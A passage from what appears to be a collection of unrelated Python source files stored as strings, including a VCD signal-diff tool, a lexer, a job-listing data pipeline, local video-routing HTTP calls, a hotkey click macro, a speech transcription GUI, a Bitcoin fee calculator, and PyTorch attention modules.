searchOccurence(f2, signal)\n        # print(F1)\n        # print(F2)\n\n        # print(len(F1))\n        # print(len(F2))\n\n        i = 0 \n        for val1,val2 in zip(F1,F2):\n            if((val1[1] != val2[1]) and i<10000) :\n                if(i==0):\n                    print(signal)\n                    printTab(len(F1))\n                    printTab(len(F2))\n                time1=val1[0]\n                time2=val2[0]\n                bin1 = val1[1].replace('b','')\n                # print(str(hex(int(bin1,2))))\n                bin2 = val2[1].replace('b','')\n                print(str(F1.index(val1)+1)+\"\\t@\"+time1+\" : 0x\"+str(format(int(bin1,2), '08x'))+\" != @\"+time2+\" : 0x\"+str(format(int(bin2,2), '08x')))\n                i+=1\n        if(i !=0):\n            print(\"\\n\")\n    return\n\ndef printTab(*args):\n    args = (\"\\t\",)+args\n    print(*args)\n\n# signals = [\"sp\"]\nsignals = [\"ra\",\"sp\",\"gp\",\"tp\",\"t0\",\"t1\",\"t2\",\"s0\",\"s1\",\"a0\",\"a1\",\"a2\",\"a3\",\"a4\",\"a5\",\"a6\",\"a7\",\"s2\",\"s3\",\"s4\",\"s5\",\"s6\",\"s7\",\"s8\",\"s9\",\"s10\",\"s11\",\"t3\",\"t4\",\"t5\",\"t6\"]\n\nvcdF1 = \"good.vcd\"\nvcdF2 = \"bad.vcd\"\n\nsearchDiff(vcdF1, vcdF2, signals)\n\nsys.stdout = old_stdout\nlog_file.close()\n\n\nend_time = ((time.time_ns() - start_time)) / 1000000\nprint(\"--- %s ms ---\" % end_time)\n\n",
    "import torch\nfrom torch import nn\nfrom torch.nn import functional as F\nimport math\n\nclass PositionalEncoding(nn.Module):\n  def __init__(self, d_model, max_len=512, dropout_prob=0.1):\n    super().__init__()\n\n    self.dropout = nn.Dropout(dropout_prob)\n\n    position_ids = torch.arange(max_len).unsqueeze(1)\n    div_term = torch.exp(torch.arange(0, d_model, 2) * (-math.log(10000.0) / d_model))\n    pe = torch.zeros(size=(1, max_len, d_model))\n    pe[0, :, 0::2] = torch.sin(position_ids / div_term)\n    pe[0, :, 1::2] = torch.cos(position_ids / div_term)\n    self.register_buffer('pe', pe)\n\n  def forward(self, x):\n    # x shape (batch_size, seq_length, d_model)\n    return x + self.pe[:, :x.size(1), :]\n\ndef _batch_gather(x, inds):\n    assert x.dim() == 3\n    batch_size = x.size(0)\n    length = x.size(1)\n    dim = x.size(2)\n\n    batch_offsets = torch.arange(batch_size, device=inds.device) * length\n    batch_offsets = batch_offsets.unsqueeze(-1)\n    assert batch_offsets.dim() == inds.dim()\n    results = F.embedding(batch_offsets + inds, x.view(batch_size * length, dim)) # batch_size, T, hidden_size\n    return results\n",
    "from sly import Lexer\n\nclass CalcLexer(Lexer):\n    # Set of token names.   This is always required\n    tokens = {  \n                NUMBER, ID, STRLT, TRUE, FALSE,\n                PLUS, MINUS, TIMES, DIVIDE, FLRDIV, MOD, MATMUL, ASSIGN,\n\n                LPAREN , RPAREN, LSQB, RSQB, LQB, RQB, PIPE,\n                READ, QUIT, CLEAR, LS\n            }\n\n\n    literals = { ';' , ',', ':'}\n\n    # String containing ignored characters\n    ignore = ' \\t'\n\n    # Regular expression rules for tokens\n    PLUS    = r'\\+'\n    MINUS   = r'-'\n    TIMES   = r'\\*'\n    FLRDIV  = r'//'\n    DIVIDE  = r'/'\n    MOD     = r'%'\n    MATMUL  = r'@'\n    ASSIGN  = r'='\n    RPAREN  = r'\\)'\n    LPAREN  = r'\\('\n    LSQB    = r'\\['\n    RSQB    = r'\\]'\n    LQB     = r'{'\n    RQB     = r'}'\n    PIPE    = r'\\|'\n\n    @_(r\"\\d+\\.\\d*\", r'\\d+')\n    def NUMBER(self, t):\n        if ( \".\" in t.value):\n            t.value = float(t.value)\n        else:\n            t.value = int(t.value)\n        return t\n    @_(r\"\\\".*?\\\"\",r\"\\'.*?\\'\")\n    def STRLT(self, t):\n        t.value = t.value.split(t.value[0])[1]\n        return t\n\n    # Identifiers and keywords\n    ID = r'[a-zA-Z_][a-zA-Z0-9_]*'\n    ID['quit']      =   QUIT\n    ID['clear']     =   CLEAR\n    ID['ls']        =   LS\n    ID['read']      =   READ\n    ID['True']      =   TRUE\n    ID['False']     =   FALSE\n\n    ignore_comment = r'\\#.*'\n\n    # Line number tracking\n    @_(r'\\n+')\n    def ignore_newline(self, t):\n        self.lineno += t.value.count('\\n')\n\n    def error(self, t):\n        print('Line %d: Bad character %r' % (self.lineno, t.value[0]))\n        self.index += 1\n\nif __name__ == '__main__':\n    data = '''\n{'A' : 1 , 'B' : 2 }\n'''\n    lexer = CalcLexer()\n    for tok in lexer.tokenize(data):\n        print(tok)",
    "import requests\nimport json\nfrom dataclasses import dataclass\nfrom typing import List\nimport time \nimport os\nfrom bytewax.connectors.stdio import StdOutSink\nfrom bytewax.dataflow import Dataflow\nfrom bytewax.inputs import FixedPartitionedSource, StatefulSourcePartition\nfrom bytewax import operators as op\nfrom bytewax.testing import run_main\n\nfrom dotenv import load_dotenv\nload_dotenv(\"./source.env\")\napi_key = os.getenv(\"api_key\")\ncache = {}\n\ndef fetch_job_listings(geo_code):\n    \"\"\"Generator to fetch job listings synchronously.\"\"\"\n    url = \"https://jsearch.p.rapidapi.com/search\"\n\n    querystring = {\"query\":geo_code,\"page\":\"1\",\"num_pages\":\"1\"}\n\n    headers = {\n        \"X-RapidAPI-Key\": api_key,\n        \"X-RapidAPI-Host\": \"jsearch.p.rapidapi.com\"\n    }\n\n    cache_key = f\"{geo_code}\"\n    if cache_key in cache:\n        # Return cached data if available\n        for job in cache[cache_key]:\n            yield job\n    else:\n        # Fetch and cache data if not available\n        fetched_data = []\n        try:\n            response = requests.get(url, headers=headers, params=querystring, timeout=10)\n            data = response.json()\n            if data[\"status\"] == \"OK\":\n                for job in data[\"data\"]:\n                    fetched_data.append(job)\n                    yield job\n                cache[cache_key] = fetched_data  # Cache the fetched data\n            else:\n                print(f\"API error: {data.get('error', 'Unknown error')}\")\n            time.sleep(35)  # Delay to respect rate limits\n        except requests.exceptions.Timeout:\n            print(\"Request timed out\")\n        except requests.exceptions.RequestException as e:\n            print(f\"Request failed: {e}\")\n\n\nclass LinkedInPartition(StatefulSourcePartition):\n    \"\"\"Custom partition for LinkedIn job listings.\"\"\"\n    def __init__(self, geo_id):\n        self.geo_id = geo_id\n\n    def next_batch(self):\n        return list(fetch_job_listings(self.geo_id))  # Fetch and return job listings as a list\n\n    def snapshot(self):\n        return None\n\n@dataclass\nclass LinkedInSource(FixedPartitionedSource):\n    \"\"\"Source class to manage multiple partitions for fetching LinkedIn job listings.\"\"\"\n    geo_codes: List[str]\n\n    def list_parts(self) -> List[str]:\n        return self.geo_codes\n\n    def build_part(self, step_id, for_key, _resume_state) -> LinkedInPartition:\n        return LinkedInPartition(for_key)\n\n# Initialize the Dataflow\nflow = Dataflow(\"linkedin_jobs\")\ninp = op.input(\n    \"input\", flow, LinkedInSource([\"AI Engineer\"])  \n)\nop.inspect(\"inspect\", inp)\nrun_main(flow)\n",
    "import requests\r\nimport time\r\n\r\ndef send_http_command(url, params):\r\n    response = requests.get(url, params=params)\r\n    if response.status_code != 200:\r\n        print(f\"Request to {url} failed with status code {response.status_code}.\")\r\n    else:\r\n        print(f\"Request to {url} was successful.\")\r\n\r\n# Normal Up NC2IO A ROUTES\r\n        \r\nurls = [\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input1_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM1 [Home]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input2_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM2 [1st]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input3_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM3 [3rd]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input4_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM4 [Outfield]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input5_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM5 [Talent]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input6_video_source\", \"source_name\": \"BIRDDOG-CROWS-NEST (CAM)\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input7_video_source\", \"source_name\": \"Black\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input8_video_source\", \"source_name\": \"Black\"}),\r\n    \r\n    # Normal Up NC2IO B ROUTES\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input1_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (CONVO-AIDA-HD200 (BASKET-RIGHT-172.16.1.88))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input2_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM 2 1ST ))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input3_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM3 3RD))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input4_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM4 OP OF))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input5_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (Cam 5 HH))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input6_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (Cam 6 - NDI OF))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input7_video_source\", \"source_name\": \"BIRDDOG-CROWS-NEST (CAM)\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input8_video_source\", \"source_name\": \"Black\"})\r\n]\r\n\r\nfor url, params in urls:\r\n    send_http_command(url, params)\r\n    time.sleep(0.5)  # wait for 0.5 seconds",
    "import pyautogui\nimport keyboard\nimport time\nimport json\nimport random\n\nen_pause = False\n\ndef pause_unpause():\n  global en_pause\n  en_pause = not en_pause\n  print(\"Paused\" if en_pause else \"Unpaused\")\n\ndef clique_competence(x1, y1, x2, y2, nom_macro):\n  global en_pause\n  if en_pause:\n    return\n  \n  x_init, y_init = pyautogui.position()\n  \n  x_click = random.uniform(x1, x2)\n  y_click = random.uniform(y1, y2)\n  \n  pyautogui.click(x_click, y_click)\n  \n  print(f\"{nom_macro} at ({x_click}, {y_click})\")\n  \n  pyautogui.moveTo(x_init, y_init)\n\ndef charger_macros():\n  with open('config.json', 'r') as file:\n    config = json.load(file)\n    for macro, details in config.items():\n      x1, y1 = details['position']['top_left']\n      x2, y2 = details['position']['bottom_right']\n      \n      def make_lambda(x1, y1, x2, y2, nom_macro):\n        return lambda: clique_competence(x1, y1, x2, y2, nom_macro)\n      \n      keyboard.add_hotkey(details['key'], make_lambda(x1, y1, x2, y2, macro))\n\nkeyboard.add_hotkey('esc', pause_unpause)\n\ncharger_macros()\n\nprint(\"WasherAutoMacro Script starting... Press CTRL+C to stop.\")\nprint(\"Press Escape to pause/unpause.\")\n\ntry:\n  while True:\n    time.sleep(1)\nexcept KeyboardInterrupt:\n  print(\"Script off.\")",
    "# -*- coding: utf-8 -*-\n\n################################################################################\n## Form generated from reading UI file 'main_window.ui'\n##\n## Created by: Qt User Interface Compiler version 6.6.3\n##\n## WARNING! All changes made in this file will be lost when recompiling UI file!\n################################################################################\n\nfrom PySide6.QtCore import (QCoreApplication, QDate, QDateTime, QLocale,\n    QMetaObject, QObject, QPoint, QRect,\n    QSize, QTime, QUrl, Qt)\nfrom PySide6.QtGui import (QBrush, QColor, QConicalGradient, QCursor,\n    QFont, QFontDatabase, QGradient, QIcon,\n    QImage, QKeySequence, QLinearGradient, QPainter,\n    QPalette, QPixmap, QRadialGradient, QTransform)\nfrom PySide6.QtWidgets import (QApplication, QGridLayout, QHBoxLayout, QLabel,\n    QListWidget, QListWidgetItem, QMainWindow, QMenuBar,\n    QPushButton, QSizePolicy, QSpacerItem, QSplitter,\n    QStackedWidget, QStatusBar, QVBoxLayout, QWidget)\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        if not MainWindow.objectName():\n            MainWindow.setObjectName(u\"MainWindow\")\n        MainWindow.resize(850, 541)\n        MainWindow.setAutoFillBackground(False)\n        self.centralwidget = QWidget(MainWindow)\n        self.centralwidget.setObjectName(u\"centralwidget\")\n        self.gridLayout = QGridLayout(self.centralwidget)\n        self.gridLayout.setObjectName(u\"gridLayout\")\n        self.splitter = QSplitter(self.centralwidget)\n        self.splitter.setObjectName(u\"splitter\")\n        self.splitter.setOrientation(Qt.Horizontal)\n        self.horizontalLayoutWidget = QWidget(self.splitter)\n        self.horizontalLayoutWidget.setObjectName(u\"horizontalLayoutWidget\")\n        self.horizontalLayout = QHBoxLayout(self.horizontalLayoutWidget)\n        self.horizontalLayout.setObjectName(u\"horizontalLayout\")\n        self.horizontalLayout.setContentsMargins(0, 0, 0, 0)\n        self.verticalLayout_2 = QVBoxLayout()\n        self.verticalLayout_2.setObjectName(u\"verticalLayout_2\")\n        self.pushButton_3 = QPushButton(self.horizontalLayoutWidget)\n        self.pushButton_3.setObjectName(u\"pushButton_3\")\n        icon = QIcon()\n        icon.addFile(u\"resources/nova.png\", QSize(), QIcon.Normal, QIcon.Off)\n        self.pushButton_3.setIcon(icon)\n        self.pushButton_3.setIconSize(QSize(25, 25))\n        self.pushButton_3.setFlat(True)\n\n        self.verticalLayout_2.addWidget(self.pushButton_3)\n\n        self.verticalSpacer = QSpacerItem(20, 40, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Expanding)\n\n        self.verticalLayout_2.addItem(self.verticalSpacer)\n\n\n        self.horizontalLayout.addLayout(self.verticalLayout_2)\n\n        self.listWidget = QListWidget(self.horizontalLayoutWidget)\n        QListWidgetItem(self.listWidget)\n        QListWidgetItem(self.listWidget)\n        QListWidgetItem(self.listWidget)\n        QListWidgetItem(self.listWidget)\n        QListWidgetItem(self.listWidget)\n        QListWidgetItem(self.listWidget)\n        self.listWidget.setObjectName(u\"listWidget\")\n\n        self.horizontalLayout.addWidget(self.listWidget)\n\n        self.splitter.addWidget(self.horizontalLayoutWidget)\n        self.verticalLayoutWidget = QWidget(self.splitter)\n        self.verticalLayoutWidget.setObjectName(u\"verticalLayoutWidget\")\n        self.verticalLayout = QVBoxLayout(self.verticalLayoutWidget)\n        self.verticalLayout.setObjectName(u\"verticalLayout\")\n        self.verticalLayout.setContentsMargins(0, 0, 0, 0)\n        self.label = QLabel(self.verticalLayoutWidget)\n        self.label.setObjectName(u\"label\")\n\n        self.verticalLayout.addWidget(self.label)\n\n        self.pushButton_2 = QPushButton(self.verticalLayoutWidget)\n        self.pushButton_2.setObjectName(u\"pushButton_2\")\n\n        self.verticalLayout.addWidget(self.pushButton_2)\n\n        self.stackedWidget = QStackedWidget(self.verticalLayoutWidget)\n        self.stackedWidget.setObjectName(u\"stackedWidget\")\n        self.page = QWidget()\n        self.page.setObjectName(u\"page\")\n        self.stackedWidget.addWidget(self.page)\n        self.page_2 = QWidget()\n        self.page_2.setObjectName(u\"page_2\")\n        self.pushButton = QPushButton(self.page_2)\n        self.pushButton.setObjectName(u\"pushButton\")\n        self.pushButton.setGeometry(QRect(50, 50, 75, 24))\n        self.stackedWidget.addWidget(self.page_2)\n\n        self.verticalLayout.addWidget(self.stackedWidget)\n\n        self.splitter.addWidget(self.verticalLayoutWidget)\n\n        self.gridLayout.addWidget(self.splitter, 0, 0, 1, 1)\n\n        MainWindow.setCentralWidget(self.centralwidget)\n        self.menubar = QMenuBar(MainWindow)\n        self.menubar.setObjectName(u\"menubar\")\n        self.menubar.setGeometry(QRect(0, 0, 850, 22))\n        MainWindow.setMenuBar(self.menubar)\n        self.statusbar = QStatusBar(MainWindow)\n        self.statusbar.setObjectName(u\"statusbar\")\n        MainWindow.setStatusBar(self.statusbar)\n\n        self.retranslateUi(MainWind",
    "import json\nimport requests\n\n# URLs of the JSON data\nurls = [\n    \"https://api.freifunk.net/data/history/20240402-12.01.01-ffSummarizedDir.json\",\n    \"https://api.freifunk.net/data/history/20240402-13.01.01-ffSummarizedDir.json\",\n    \"https://api.freifunk.net/data/history/20240402-14.01.01-ffSummarizedDir.json\"\n]\n\n# Initialize counters for each date\ndates_data = {}\n\n# Iterate over each URL\nfor url in urls:\n    # Fetch the JSON data from the URL\n    response = requests.get(url)\n\n    # Check if the request was successful\n    if response.status_code == 200:\n        data = response.json()\n        # Extract the date from the URL\n        date = url.split('/')[-1].split('-')[1]\n        # Initialize counters for this date\n        total_nodes = 0\n        zero_nodes = 0\n        no_nodes_key = 0\n        total_cities = 0\n\n        # Iterate over the list of city objects\n        for city_name, city_data in data.items():\n            total_cities += 1 # Increment the total cities counter\n            # Check if 'city_data' is a dictionary and contains 'state' key\n            if isinstance(city_data, dict) and 'state' in city_data:\n                # Check if 'state' is a dictionary\n                if isinstance(city_data['state'], dict):\n                    # Check if 'state' contains 'nodes' key\n                    if 'nodes' in city_data['state']:\n                        # Add the number of nodes for the current city to the total\n                        nodes = city_data['state']['nodes']\n                        total_nodes += nodes\n                        if nodes == 0:\n                            zero_nodes += 1\n                    else:\n                        no_nodes_key += 1\n                else:\n                    print(f\"Unexpected structure for city: {city_name}\")\n            else:\n                print(f\"Unexpected structure for city: {city_name}\")\n\n        # Store the data for this date\n        dates_data[date] = {\n            \"total_cities\": total_cities,\n            \"total_nodes\": total_nodes,\n            \"zero_nodes\": zero_nodes,\n            \"no_nodes_key\": no_nodes_key\n        }\n    else:\n        print(f\"Failed to fetch data from {url}. Status code: {response.status_code}\")\n\n# Print the data for each date\nfor date, data in dates_data.items():\n    print(f\"Date: {date}\")\n    print(f\"Total number of cities: {data['total_cities']}\")\n    print(f\"Total number of nodes: {data['total_nodes']}\")\n    print(f\"Cities with zero nodes: {data['zero_nodes']}\")\n    print(f\"Cities with no 'nodes' key: {data['no_nodes_key']}\")\n    print()",
    "import tkinter as tk\nfrom tkinter import filedialog, messagebox, scrolledtext\nimport os\nimport threading\nfrom pydub import AudioSegment\nfrom vosk import Model, KaldiRecognizer\nimport wave\nimport json\n\ndef convert_to_wav(audio_path, output_directory):\n    if not audio_path.lower().endswith('.wav'):\n        output_path = os.path.join(output_directory, os.path.basename(audio_path).rsplit('.', 1)[0] + '.wav')\n        audio = AudioSegment.from_file(audio_path, format=audio_path.split('.')[-1])\n        audio.export(output_path, format=\"wav\")\n        return output_path\n    else:\n        return audio_path\n\ndef transcribe_audio_vosk(audio_path, model_path, callback):\n    try:\n        model = Model(model_path)\n        with wave.open(audio_path, \"rb\") as wf:\n            recognizer = KaldiRecognizer(model, wf.getframerate())\n            full_transcription = \"\"\n            while True:\n                data = wf.readframes(4000)\n                if len(data) == 0:\n                    break\n                if recognizer.AcceptWaveform(data):\n                    part_result = json.loads(recognizer.Result())\n                    full_transcription += part_result.get('text', '') + \" \"\n            part_result = json.loads(recognizer.FinalResult())\n            full_transcription += part_result.get('text', '')\n        callback(full_transcription.strip())\n    except Exception as e:\n        messagebox.showerror(\"Error\", f\"Failed to transcribe audio. Error: {e}\")\n\ndef update_transcription_text(transcription):\n    transcription_text.configure(state='normal')\n    transcription_text.delete(1.0, tk.END)\n    transcription_text.insert(tk.END, transcription)\n    transcription_text.configure(state='disabled')\n\ndef select_model_path():\n    model_path_value = filedialog.askdirectory()\n    if model_path_value:\n        model_path.set(model_path_value)\n\ndef select_file():\n    model_path_value = model_path.get()\n    if not model_path_value or not os.path.exists(model_path_value):\n        messagebox.showerror(\"Error\", \"Please select a valid Vosk model directory.\")\n        return\n    \n    file_path = filedialog.askopenfilename()\n    if file_path:\n        output_directory = None\n        if not file_path.lower().endswith('.wav'):\n            output_directory = filedialog.askdirectory(title=\"Select Output Directory for WAV Conversion\")\n            if not output_directory:\n                messagebox.showerror(\"Error\", \"Output directory is required for non-WAV files.\")\n                return\n            file_path = convert_to_wav(file_path, output_directory)\n\n        # Transcription is run on a separate thread to keep GUI responsive\n        threading.Thread(target=transcribe_audio_vosk, args=(file_path, model_path_value, update_transcription_text), daemon=True).start()\n\nroot = tk.Tk()\nroot.title(\"AudioDictate\")\n\n# Model path selection\nmodel_path_frame = tk.Frame(root)\nmodel_path_label = tk.Label(model_path_frame, text=\"Vosk Model Path:\")\nmodel_path_label.pack(side=tk.LEFT, padx=(0, 10))\nmodel_path = tk.StringVar()\nmodel_path_entry = tk.Entry(model_path_frame, textvariable=model_path, width=50)\nmodel_path_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)\nmodel_path_button = tk.Button(model_path_frame, text=\"Select\", command=select_model_path)\nmodel_path_button.pack(side=tk.LEFT)\nmodel_path_frame.pack(pady=5, padx=5, fill=tk.X)\n\n# Transcription display area\ntranscription_frame = tk.LabelFrame(root, text=\"Transcription\")\ntranscription_text = scrolledtext.ScrolledText(transcription_frame, width=60, height=15, state='disabled')\ntranscription_text.pack(expand=True, fill=tk.BOTH, padx=5, pady=5)\ntranscription_frame.pack(pady=10, padx=5, fill=tk.BOTH, expand=True)\n\n# Button to select file\nselect_file_button = tk.Button(root, text=\"Select Audio File\", command=select_file)\nselect_file_button.pack(pady=5)\n\nroot.mainloop()\n",
    "import streamlit as st\n\nTOTAL_SUPPLY = 21_000_000.00\nSATS_PER_BTC = 100_000_000.00\nBLOCKS_PER_YEAR = 6 * 24 * 365 # 6 blocks per hour, 24 hours per day, 365 days per year\nVBYTES_PER_BLOCK = 1_000_000\n\ndef calculate_security_cost_yearly(tx_per_year, security_budget_rate):\n    return TOTAL_SUPPLY * security_budget_rate \n\ndef calculate_cost_per_tx(security_cost, tx_per_year):\n    return security_cost / tx_per_year\n\ndef calculate_cost_in_sats(cost_per_tx, sats_per_btc):\n    return cost_per_tx * sats_per_btc\n\ndef calculate_txs_per_block(vbytes_per_tx):\n    return VBYTES_PER_BLOCK / vbytes_per_tx\n\ndef main():\n    st.title(\"Bitcoin Lightning Implications\")\n\n    st.sidebar.title(\"Parameters\")\n    price = st.sidebar.number_input(\"Bitcoin Price\", value=1_000_000.00)\n    vbytes_per_tx = st.sidebar.number_input(\"vBytes Per Average Ln Transaction\", value=164.25)\n    tx_per_year = calculate_txs_per_block(vbytes_per_tx) * BLOCKS_PER_YEAR\n    security_budget_rate = st.sidebar.slider(\"Security Budget Rate Basis Points\", value=30, min_value=1, max_value=300, step=1) / 10_000\n    logical_max_fee_to_pay = st.sidebar.slider(\"Logical Max Fee to Pay Basis Points\", value=100, min_value=1, max_value=300, step=1) / 10_000\n    average_txs_per_node_per_year = st.sidebar.slider(\"Average Txs per Node per Year\", value=1, min_value=1, max_value=10, step=1)\n    \n    st.write(\"## On-Chain Capacity\")\n    st.write(\"Bitcoin has a fixed supply of 21 million BTC. The security budget is a percentage of the total supply that must go to miners to maintain the security of the network. Currently, the security budget is set at 30 basis points, or 0.3% of the total supply. This is the cost of securing the network for a year. This assumes the subsidy is zero and the only income for miners is the transaction fees.\")\n    txs_per_block = calculate_txs_per_block(vbytes_per_tx)\n    security_cost = calculate_security_cost_yearly(tx_per_year, security_budget_rate)\n    cost_per_block = security_cost / BLOCKS_PER_YEAR\n    \n    col1, col2, col3 = st.columns(3)\n    \n    col1.metric(\"Txs Per Block\", f\"{txs_per_block:,.0f}\", \"\")\n    col2.metric(\"Security Cost Yearly\", f\"{security_cost:,.0f} BTC\", \"\")\n    col3.metric(\"Cost Per Block\", f\"{cost_per_block:,.2f} BTC\", \"\")\n\n    cost_per_tx = SATS_PER_BTC * cost_per_block / txs_per_block\n    \n    st.write(\"## Cost per Transaction\")\n    st.write(\"The cost per transaction is the cost of securing the network divided by the number of transactions per year. This is the cost of securing the network per transaction incurred by the users.\")\n    col4, col5, col6 = st.columns(3)\n    col4.metric(\"Cost Per Transaction\", f\"{cost_per_tx:,.0f} sats\", \"\")\n    col5.metric(\"Cost Per Transaction\", f\"${cost_per_tx / SATS_PER_BTC * price:,.2f}\", \"\")\n    col6.metric(\"Cost Per Transaction\", f\"{cost_per_tx / vbytes_per_tx :,.0f} sat/vB\", \"\")\n    \n    implied_channel_size =  cost_per_tx / logical_max_fee_to_pay\n    st.write(\"## Logical Channel Sizes\")\n    st.write(\"The logical channel size is based on the cost per transaction and the logical max fee to pay. This is the implied channel size that can be supported by the cost per transaction. For example no one would open a channel with a capacity of 100,000 sats if the cost per transaction is 20k sats, a 20% fee. I suspect the logical max fee to pay is around 100 basis points or 1% of the channel size.\")\n    col7, col8, col9 = st.columns(3)\n    \n    col7.metric(\"Implied Channel Size\", f\"{implied_channel_size:,.0f} sats\", \"\")\n    col8.metric(\"Implied Channel Size\", f\"${implied_channel_size / SATS_PER_BTC * price:,.0f}\", \"\")\n    col9.metric(\"Implied Channel Size\", f\"{implied_channel_size / vbytes_per_tx :,.0f} sat/vB\", \"\")\n    \n    st.write(\"## Max number of channels and nodes\")\n    st.write(\"The max number of channels and nodes is based on the total supply of bitcoin and the implied channel size. This is the maximum number of channels and nodes that can be supported by the total supply of bitcoin.\")\n    max_channels = TOTAL_SUPPLY*SATS_PER_BTC / implied_channel_size\n    st.write(f\"Max Channels: {max_channels:,.0f}\")\n    st.write(f\"Implied Number of Nodes: {max_channels / average_txs_per_node_per_year:,.0f}\")\n    \n    st.write(\"## Time required to open all channels\")\n    time_to_open_all_channels = max_channels / tx_per_year\n    st.write(f\"Time to Open All Channels: {time_to_open_all_channels:,.2f} years\")\n    \n    \n\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "\"\"\"\r\nCore of BiFormer, Bi-Level Routing Attention.\r\n\r\nTo be refactored.\r\n\r\nauthor: ZHU Lei\r\ngithub: https://github.com/rayleizhu\r\nemail: ray.leizhu@outlook.com\r\n\r\nThis source code is licensed under the license found in the\r\nLICENSE file in the root directory of this source tree.\r\n\"\"\"\r\nfrom typing import Tuple, Optional\r\n\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\nfrom einops import rearrange\r\nfrom torch import Tensor, LongTensor\r\n\r\n\r\nclass TopkRouting(nn.Module):\r\n    \"\"\"\r\n    differentiable topk routing with scaling\r\n    Args:\r\n        qk_dim: int, feature dimension of query and key\r\n        topk: int, the 'topk'\r\n        qk_scale: int or None, temperature (multiply) of softmax activation\r\n        with_param: bool, wether inorporate learnable params in routing unit\r\n        diff_routing: bool, wether make routing differentiable\r\n        soft_routing: bool, wether make output value multiplied by routing weights\r\n    \"\"\"\r\n    def __init__(self, qk_dim, topk=4, qk_scale=None, param_routing=False, diff_routing=False):\r\n        super().__init__()\r\n        self.topk = topk\r\n        self.qk_dim = qk_dim\r\n        self.scale = qk_scale or qk_dim ** -0.5\r\n        self.diff_routing = diff_routing\r\n        # TODO: norm layer before/after linear?\r\n        self.emb = nn.Linear(qk_dim, qk_dim) if param_routing else nn.Identity()\r\n        # routing activation\r\n        self.routing_act = nn.Softmax(dim=-1)\r\n    \r\n    def forward(self, query:Tensor, key:Tensor)->Tuple[Tensor]:\r\n        \"\"\"\r\n        Args:\r\n            q, k: (n, p^2, c) tensor\r\n        Return:\r\n            r_weight, topk_index: (n, p^2, topk) tensor\r\n        \"\"\"\r\n        if not self.diff_routing:\r\n            query, key = query.detach(), key.detach()\r\n        query_hat, key_hat = self.emb(query), self.emb(key) # per-window pooling -> (n, p^2, c) \r\n        attn_logit = (query_hat*self.scale) @ key_hat.transpose(-2, -1) # (n, p^2, p^2)\r\n        topk_attn_logit, topk_index = torch.topk(attn_logit, k=self.topk, dim=-1) # (n, p^2, k), (n, p^2, k)\r\n        r_weight = self.routing_act(topk_attn_logit) # (n, p^2, k)\r\n        \r\n        return r_weight, topk_index\r\n        \r\n\r\nclass KVGather(nn.Module):\r\n    def __init__(self, mul_weight='none'):\r\n        super().__init__()\r\n        assert mul_weight in ['none', 'soft', 'hard']\r\n        self.mul_weight = mul_weight\r\n\r\n    def forward(self, r_idx:Tensor, r_weight:Tensor, kv:Tensor):\r\n        \"\"\"\r\n        r_idx: (n, p^2, topk) tensor\r\n        r_weight: (n, p^2, topk) tensor\r\n        kv: (n, p^2, w^2, c_kq+c_v)\r\n\r\n        Return:\r\n            (n, p^2, topk, w^2, c_kq+c_v) tensor\r\n        \"\"\"\r\n        # select kv according to routing index\r\n        n, p2, w2, c_kv = kv.size()\r\n        topk = r_idx.size(-1)\r\n        # print(r_idx.size(), r_weight.size())\r\n        # FIXME: gather consumes much memory (topk times redundancy), write cuda kernel? \r\n        topk_kv = torch.gather(kv.view(n, 1, p2, w2, c_kv).expand(-1, p2, -1, -1, -1), # (n, p^2, p^2, w^2, c_kv) without mem cpy\r\n                                dim=2,\r\n                                index=r_idx.view(n, p2, topk, 1, 1).expand(-1, -1, -1, w2, c_kv) # (n, p^2, k, w^2, c_kv)\r\n                               )\r\n\r\n        if self.mul_weight == 'soft':\r\n            topk_kv = r_weight.view(n, p2, topk, 1, 1) * topk_kv # (n, p^2, k, w^2, c_kv)\r\n        elif self.mul_weight == 'hard':\r\n            raise NotImplementedError('differentiable hard routing TBA')\r\n        # else: #'none'\r\n        #     topk_kv = topk_kv # do nothing\r\n\r\n        return topk_kv\r\n\r\nclass QKVLinear(nn.Module):\r\n    def __init__(self, dim, qk_dim, bias=True):\r\n        super().__init__()\r\n        self.dim = dim\r\n        self.qk_dim = qk_dim\r\n        self.qkv = nn.Linear(dim, qk_dim + qk_dim + dim, bias=bias)\r\n    \r\n    def forward(self, x):\r\n        q, kv = self.qkv(x).split([self.qk_dim, 